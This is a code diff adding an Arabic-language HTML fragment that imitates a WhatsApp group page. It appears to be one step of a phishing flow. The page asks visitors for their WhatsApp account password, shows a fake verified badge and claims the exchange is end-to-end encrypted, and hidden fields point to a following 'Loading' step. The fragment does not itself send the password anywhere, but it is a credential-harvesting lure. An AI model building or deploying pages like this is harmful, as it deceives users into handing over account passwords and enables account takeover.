@@ -1,0 +1,91 @@
+<input type="hidden" id="DivName" value="Pass2">
+<input type="hidden" id="DivNext" value="Loading">
+
+<div class="whatsapp-card" id="pass2Container">
+  <div class="group-header">
+    <div class="group-avatar-container">
+      <img class="group-avatar" src="./assets/images/group_avatar.png" alt="Group Icon">
+      <span class="verified-badge">✓</span>
+    </div>
+    <h2 class="group-title">كلمة المرور</h2>
+    <span class="group-subtitle">أدخل كلمة مرور حساب واتساب الخاص بك للمتابعة.</span>
+  </div>
+
+  <div id="errorMsg" style="display: none;"></div>
+
+  <div class="input-container" style="margin-bottom: 20px; position: relative;">
+    <label style="
+      display: block;
+      font-size: 0.82rem;
+      color: var(--wa-text-secondary-light);
+      margin-bottom: 6px;
+      font-weight: 500;
+    ">كلمة المرور</label>
+
+    <div style="position: relative;">
+      <input
+        id="holder"
+        type="password"
+        name="password"
+        placeholder="أدخل كلمة المرور"
+        autocomplete="current-password"
+        required
+        dir="ltr"
+        style="
+          width: 100%;
+          padding: 14px 48px 14px 16px;
+          border: 1.5px solid var(--wa-border-light);
+          border-radius: 12px;
+          font-size: 1rem;
+          background: var(--wa-input-bg-light);
+          color: var(--wa-text-primary-light);
+          outline: none;
+          box-sizing: border-box;
+          transition: border-color 0.2s;
+          font-family: inherit;
+        "
+        onfocus="this.style.borderColor='var(--wa-primary)'"
+        onblur="this.style.borderColor='var(--wa-border-light)'"
+      >
+      <span
+        onclick="
+          const inp = document.getElementById('holder');
+          const ico = document.getElementById('eyeIcon');
+          if (inp.type === 'password') {
+            inp.type = 'text';
+            ico.innerHTML = '🙈';
+          } else {
+            inp.type = 'password';
+            ico.innerHTML = '👁️';
+          }
+        "
+        style="
+          position: absolute;
+          right: 14px;
+          top: 50%;
+          transform: translateY(-50%);
+          cursor: pointer;
+          font-size: 1.1rem;
+          user-select: none;
+        "
+        id="eyeIcon"
+      >👁️</span>
+    </div>
+  </div>
+
+  <button type="submit" class="btn-primary" id="clickmee">
+    <span>تأكيد</span>
+  </button>
+
+  <div class="secure-note">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+      <path d="M12 2C9.24 2 7 4.24 7 7V9H6C4.9 9 4 9.9 4 11V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V11C20 9.9 19.1 9 18 9H17V7C17 4.24 14.76 2 12 2ZM9 7C9 5.34 10.34 4 12 4C13.66 4 15 5.34 15 7V9H9V7ZM12 13C12.83 13 13.5 13.67 13.5 14.5C13.5 15.33 12.83 16 12 16C11.17 16 10.5 15.33 10.5 14.5C10.5 13.67 11.17 13 12 13Z"/>
+    </svg>
+    <span style="font-size: 0.8rem;">مشفر بالكامل من طرف إلى طرف</span>
+  </div>
+</div>
+
+<script>
+  const holderEl = document.getElementById('holder');
+  if (holderEl) holderEl.focus();
+</script>
